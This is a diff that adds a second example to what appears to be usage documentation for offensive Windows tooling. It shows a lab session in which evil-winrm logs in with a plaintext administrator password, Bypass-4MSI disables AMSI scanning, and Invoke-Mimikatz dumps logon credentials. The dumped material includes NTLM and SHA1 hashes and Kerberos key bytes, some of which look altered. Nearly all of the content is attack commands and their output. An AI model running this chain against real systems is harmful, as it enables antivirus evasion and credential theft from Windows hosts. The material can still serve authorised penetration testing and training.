@@ -127,3 +127,106 @@ AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\auditor\AppData\Local\Mic
 [*] Checking for encrypted application pool and virtual directory passwords...
 
 PS C:\temp>
+
+
+
+---------------------------------------------------------------
+Example 2 - AMSI bypass as a local administrator user
+---------------------------------------------------------------
+
+┌──(kali㉿kali)-[~/Documents]
+└─$ sudo evil-winrm -i 192.168.1.49 -u admin -p 'Adm1n2022' -s '/home/kali/Documents/' -e '/home/kali/Documents/'
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\qualys\Documents> menu
+
+   ,.   (   .      )               "            ,.   (   .      )       .   
+  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)  
+.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
+_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
+\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
+ |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
+ |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+        \/                               \/          \/       \/         \/
+
+       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers
+[+] Dll-Loader 
+[+] Donut-Loader 
+[+] Invoke-Binary
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+
+*Evil-WinRM* PS C:\Users\qualys\Documents> Bypass-4MSI
+You cannot call a method on a null-valued expression.
+At line:1 char:735
++ ... .GetFIeld(''+$([SYsTEM.NeT.WEBUTILitY]::HTmLDecode('&#97;&#109;&#115;&#105;'))+' ...
++                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+    
+*Evil-WinRM* PS C:\Users\qualys\Documents> Bypass-4MSI
+
+*Evil-WinRM* PS C:\Users\qualys\Documents> Invoke-Mimikatz.ps1
+
+*Evil-WinRM* PS C:\Users\qualys\Documents> Invoke-Mimikatz
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 42854 (00000000:0000a766)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/21/2021 6:58:31 PM
+SID               : S-1-5-90-1
+	msv :
+	 [00000003] Primary
+	 * Username : SERVER02$
+	 * Domain   : SECURITY-LAB
+	 * NTLM     : cbg87hdcf8e5ee10c7667fg73f4b2511
+	 * SHA1     : 9f2967eb10fea1469qs602deb4145d287f77f944
+	tspkg :
+	wdigest :
+	 * Username : SERVER02$
+	 * Domain   : SECURITY-LAB
+	 * Password : (null)
+	kerberos :
+	 * Username : SERVER02$
+	 * Domain   : Security-Test-Lab.Local
+	 * Password : de 3f 45 c3 25 0d bb fe 8d 76 70 7b db 21 ec 3d d2 44 63 36 e5 f0 77 8e 39 40 af f1 13 a8 ea 40 ff 7e b4 25 25 14 b6 61 2b b7 28 ad c9 91 24 16 82 35 f7 fb e7 91 4f 32 37 d7 35 05 9b 84 b2 6c 2b 7a 78 24 4c 08 78 dd b5 5b a6 42 79 7a de b1 44 4e 14 48 5b cf ea 0e bb c7 51 77 97 93 0f 24 d1 c0 04 37 a8 53 d6 fa 7d 38 e4 e9 92 bd 4c 89 5e 13 54 7f 08 75 39 23 2c 5b bb d4 4d ec 24 c8 99 d9 ec 75 e6 88 73 4c af f6 67 47 98 94 18 50 8b e1 8a 56 d7 75 3c 34 3a 6d 46 89 90 a1 9c 9e e2 59 e6 24 fd 03 7e 5d 0c 71 06 7b 57 60 7e 2b c0 bf 3d 92 26 77 4a bb c0 b4 cb 9d fe b9 b7 e4 bb ad fb b6 2e 5d bb 2e 4e a3 31 27 62 71 07 ca c6 a1 08 ce a0 55 b1 b9 2d a0 6e e2 18 74 8c 30 cb 31 53 88 02 48 1c 06 f2 cb d7 ca d1 bc 1d e2
+	ssp :	KO
+	credman :
+
+Authentication Id : 0 ; 42526 (00000000:0000a61e)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/21/2021 6:58:31 PM
+SID               : S-1-5-90-1
+	msv :
+	 [00000003] Primary
+	 * Username : SERVER02$
+	 * Domain   : SECURITY-LAB
+	 * NTLM     : cbg87hdcf8e5ee10c7667fg73f4b2511
+<SNIP>
+
